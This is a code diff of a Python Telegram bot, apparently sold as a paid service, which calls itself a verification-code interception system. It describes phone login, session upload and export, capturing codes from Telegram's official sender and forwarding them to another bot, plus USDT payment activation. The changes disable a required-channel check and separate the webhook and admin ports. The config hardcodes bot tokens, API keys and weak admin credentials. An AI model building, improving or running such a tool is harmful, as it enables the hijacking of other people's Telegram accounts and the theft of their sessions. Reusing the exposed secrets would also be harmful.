@@ -1,7 +1,7 @@
 #!/usr/bin/env python3
 # -*- coding: utf-8 -*-
 """
-Telegram 验证码拦截机器人 - 完整增强版
+Telegram 验证码拦截机器人 - 完整增强版 (Railway 修复版)
 功能：手机号登录 / Session上传 / 验证码拦截 / OKPay支付激活 / 备用卡密 / 管理员系统 / Webhook回调 / Web后台
 作者: @APl520
 """
@@ -65,7 +65,7 @@ class Config:
     """配置类 - 所有配置项集中管理"""
 
     # ---------- Telegram Bot 配置 ----------
-    BOT_TOKEN: str = "8526937606:AAHUXe6jbhsi9Y25Yex4VsgyLtKdztehWM4"
+    BOT_TOKEN: str = "8826676249:AAFwagmUOm_vqnDXpWOmP8h3olOuBHoT5Ok"
     API_ID: int = 33059943
     API_HASH: str = "1c73a0510ba0b8cb3bd16f24acfd62bf"
 
@@ -85,14 +85,15 @@ class Config:
     PAYMENT_COIN: str = "USDT"                         # 支付币种 (USDT / TRX)
 
     # ---------- 频道配置 ----------
-    REQUIRED_CHANNEL: str = "@BMW99111"                # 用户必须加入的频道
-    FORWARD_CHANNEL: str = "@BMW99111"                 # Session导出频道
+    REQUIRED_CHANNEL: str = ""                         # 留空=不验证（原来是 @BMW99111）
+    FORWARD_CHANNEL: str = ""                          # 留空=不导出
     FORWARD_BOT_USERNAME: str = "peohikkbot"           # 转发验证码的目标机器人
     TELEGRAM_BOT_ID: int = 777000                     # Telegram官方验证码发送者ID
 
     # ---------- Webhook / Web 配置 ----------
     WEBHOOK_HOST: str = "0.0.0.0"
-    WEBHOOK_PORT: int = 39999
+    WEBHOOK_PORT: int = 39999                         # Webhook 回调端口
+    WEB_ADMIN_PORT: int = 39998                       # Web 后台管理端口（和 Webhook 分开）
     WEBHOOK_PATH: str = "/webhook/okpay"
     WEB_USER: str = "admin"                           # Web后台用户名
     WEB_PASS: str = "admin123"                        # Web后台密码
@@ -1320,6 +1321,10 @@ class ChannelVerifier:
         Returns:
             (是否加入, 详细信息)
         """
+        # 如果 REQUIRED_CHANNEL 为空，直接通过
+        if not Config.REQUIRED_CHANNEL:
+            return True, "频道验证已禁用"
+
         try:
             bot = context.bot
 
@@ -1347,6 +1352,8 @@ class ChannelVerifier:
     @staticmethod
     def get_join_keyboard() -> InlineKeyboardMarkup:
         """获取加入频道的按钮"""
+        if not Config.REQUIRED_CHANNEL:
+            return InlineKeyboardMarkup([])
         return InlineKeyboardMarkup([
             [InlineKeyboardButton(
                 "📢 点击加入频道",
@@ -1416,6 +1423,9 @@ class PermissionChecker:
     async def _send_join_required(update: Update, user_id: int,
                                   context: ContextTypes.DEFAULT_TYPE):
         """发送需要加入频道的消息"""
+        if not Config.REQUIRED_CHANNEL:
+            return
+
         msg = (
             "🔐 <b>加入频道验证</b>\n\n"
             "⚠️ 您需要先加入指定频道才能使用本机器人！\n\n"
@@ -1610,10 +1620,12 @@ class BotHandlers:
         sessions = SessionManager.get_active_sessions(user_id)
         count = len(sessions)
 
+        status_text = f"\n\n📊 当前监控: {count} 个账号" if count > 0 else ""
+
         await update.message.reply_text(
             f"👋 <b>Telegram 验证码拦截系统</b>\n"
             f"作者 @APl520\n\n"
-            f"请选择操作：{f'\\n\\n📊 当前监控: {count} 个账号' if count > 0 else ''}",
+            f"请选择操作：{status_text}",
             parse_mode='HTML',
             reply_markup=Keyboards.main()
         )
@@ -2053,7 +2065,7 @@ class BotHandlers:
         if data == "show_pay_link" or data.startswith("check_pay:"):
             # 检查是否已加入频道
             is_joined, _ = await ChannelVerifier.check_user_in_channel(context, user_id)
-            if not is_joined:
+            if not is_joined and Config.REQUIRED_CHANNEL:
                 await query.edit_message_text(
                     "⚠️ 请先加入频道后再操作。",
                     reply_markup=ChannelVerifier.get_join_keyboard()
@@ -2548,14 +2560,14 @@ class BotHandlers:
             await update.message.reply_text(
                 f"✅ <b>用户 {target_user_id}</b>\n"
                 f"状态：已加入频道\n\n"
-                f"📢 频道：{Config.REQUIRED_CHANNEL}",
+                f"📢 频道：{Config.REQUIRED_CHANNEL or '已禁用'}",
                 parse_mode='HTML'
             )
         else:
             await update.message.reply_text(
                 f"❌ <b>用户 {target_user_id}</b>\n"
                 f"状态：未加入频道\n\n"
-                f"📢 频道：{Config.REQUIRED_CHANNEL}\n\n"
+                f"📢 频道：{Config.REQUIRED_CHANNEL or '已禁用'}\n\n"
                 f"请提醒用户加入频道后使用 /start 重新验证。",
                 parse_mode='HTML'
             )
@@ -2787,10 +2799,10 @@ class WebAdmin:
     def run(cls):
         """运行Web服务器"""
         cls.setup_routes()
-        logger.info(f"Web后台启动: http://{Config.WEBHOOK_HOST}:{Config.WEBHOOK_PORT}")
+        logger.info(f"Web后台启动: http://{Config.WEBHOOK_HOST}:{Config.WEB_ADMIN_PORT}")
         cls.app.run(
             host=Config.WEBHOOK_HOST,
-            port=Config.WEBHOOK_PORT,
+            port=Config.WEB_ADMIN_PORT,
             debug=False,
             use_reloader=False
         )
@@ -2881,18 +2893,18 @@ def main():
     setup_logging()
 
     logger.info("=" * 50)
-    logger.info("Telegram 验证码拦截系统 - 完整增强版")
+    logger.info("Telegram 验证码拦截系统 - 完整增强版 (Railway修复)")
     logger.info("=" * 50)
 
     # 刷新管理员缓存
     AdminManager.refresh_cache()
 
-    # 启动Web后台（独立线程）
+    # 启动 Web 后台（端口 39998）
     web_thread = threading.Thread(target=WebAdmin.run, daemon=True)
     web_thread.start()
-    logger.info(f"Web后台: http://0.0.0.0:{Config.WEBHOOK_PORT}")
+    logger.info(f"Web后台: http://0.0.0.0:{Config.WEB_ADMIN_PORT}")
 
-    # 启动Webhook服务器（独立线程）
+    # 启动 Webhook 服务器（端口 39999）
     webhook_thread = threading.Thread(target=WebhookServer.run, daemon=True)
     webhook_thread.start()
     logger.info(f"Webhook: http://0.0.0.0:{Config.WEBHOOK_PORT}{Config.WEBHOOK_PATH}")
@@ -2965,10 +2977,10 @@ def main():
 
     # ===== 启动信息 =====
     logger.info("=" * 50)
-    logger.info("Bot 启动成功")
+    logger.info("Bot 启动成功 ✅")
     logger.info(f"超级管理员: {Config.SUPER_ADMIN_IDS}")
     logger.info(f"普通管理员: {[a['id'] for a in AdminManager.list_admins() if not a['is_super']]}")
-    logger.info(f"要求加入频道: {Config.REQUIRED_CHANNEL}")
+    logger.info(f"要求加入频道: {Config.REQUIRED_CHANNEL or '已禁用'}")
     logger.info(f"支付金额: {Config.PAYMENT_AMOUNT} {Config.PAYMENT_COIN}")
     logger.info("=" * 50)
 
